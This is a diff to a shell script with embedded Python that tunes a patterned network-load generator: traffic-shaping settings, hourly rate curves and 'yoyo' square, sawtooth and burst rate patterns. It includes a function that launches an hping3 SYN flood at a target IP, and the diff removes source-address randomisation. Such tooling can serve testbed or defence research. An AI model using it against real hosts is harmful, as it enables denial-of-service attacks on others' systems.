@@ -14,8 +14,8 @@ VERBOSE=true
 
 # TC QDISC config
 PACKET_SIZE=60        # bytes
-BURST_SIZE="64k"      # bits
-LATENCY="200ms"
+BURST_SIZE="500"      # bytes
+LATENCY="5ms"
 MIN_RATE="1kbit"
 MAX_RATE="1gbit"
 
@@ -120,15 +120,15 @@ create_python_calculator() {
 import math
 import sys
 
-def calculate_hourly_rate(hour, scale_factor=100):
+def calculate_hourly_rate(hour, scale_factor=120):
     """
     Calculate traffic rate hourly with peak patterns
     """
     # Morning peak (9 AM) - Gaussian distribution
-    morning_peak = 25 * math.exp(-((hour - 9) ** 2) / 6.25)
+    morning_peak = 36 * math.exp(-((hour - 9) ** 2) / 6.8)
     
     # Evening peak (8 PM) - Gaussian distribution  
-    evening_peak = 45 * math.exp(-((hour - 20) ** 2) / 7.84)
+    evening_peak = 55 * math.exp(-((hour - 20) ** 2) / 7.84)
     
     # Night drop (2:30 AM) - Negative Gaussian
     night_drop = -15 * math.exp(-((hour - 2.5) ** 2) / 3.24)
@@ -143,7 +143,7 @@ def calculate_hourly_rate(hour, scale_factor=100):
     traffic_factor = base_level + morning_peak + evening_peak + night_drop + daily_cycle
     
     # Calculate PPS with minimum threshold
-    pps = max(300, traffic_factor * scale_factor)
+    pps = max(500, traffic_factor * scale_factor)
     
     return int(pps)
 
@@ -168,7 +168,7 @@ def calculate_minute_factor(minute_in_hour):
     """
     Calculate the minute-by-minute variation within an hour
     """
-    return 1 + 0.3 * math.sin(2 * math.pi * minute_in_hour / 60)
+    return 1 + 0.2 * math.sin(2 * math.pi * minute_in_hour / 60)
 
 def get_compressed_time(elapsed_seconds, compression_factor):
     """
@@ -185,7 +185,7 @@ def get_compressed_time(elapsed_seconds, compression_factor):
     
     return current_hour, day_of_week, minute_in_hour
 
-def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.15):
+def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.1):
     """
     Total traffic rate with multiple factors
     """
@@ -207,26 +207,26 @@ def calculate_traffic_rate(elapsed_seconds, compression_factor, noise_factor=0.1
     
     return max(1, int(final_rate)), hour, day, minute
 
-def calculate_yoyo_rate(elapsed_seconds, cycle_duration=20, yoyo_type="square"):
+def calculate_yoyo_rate(elapsed_seconds, cycle_duration=1800, yoyo_type="square"):
     """
     Calculating pattern rates
     """
     cycle_position = (elapsed_seconds % cycle_duration) / cycle_duration
     
     if yoyo_type == "square":
-        return 5000 if cycle_position < 0.5 else 500
+        return 10000 if cycle_position < 0.5 else 100
     elif yoyo_type == "sawtooth":
-        if cycle_position < 0.8:
-            return int(1000 + 9000 * cycle_position / 0.8)
+        if cycle_position < 0.7:
+            return int(1000 + 10000 * cycle_position / 0.7)
         else:
             return 1000
     elif yoyo_type == "burst":
         if cycle_position < 0.2:
-            return 10000
+            return 8000
         elif cycle_position < 0.4:
-            return 4000
+            return 5000
         else:
-            return 2000
+            return 500
     else:
         return 5000
 
@@ -357,7 +357,6 @@ start_hping3_flood() {
     hping3 \
         -S \
         --flood \
-        --rand-source \
         -p 80 \
         --interface "$INTERFACE" \
         "$TARGET_IP" \
@@ -393,7 +392,7 @@ generate_compressed_pattern_python() {
         return 1
     fi
     
-    local update_interval=3
+    local update_interval=60
     local current_time=0
     local last_rate=""
     
@@ -455,7 +454,7 @@ generate_yoyo_pattern_python() {
         return 1
     fi
     
-    local update_interval=2
+    local update_interval=60
     local current_time=0
     
     while [ $current_time -lt $duration_seconds ]; do
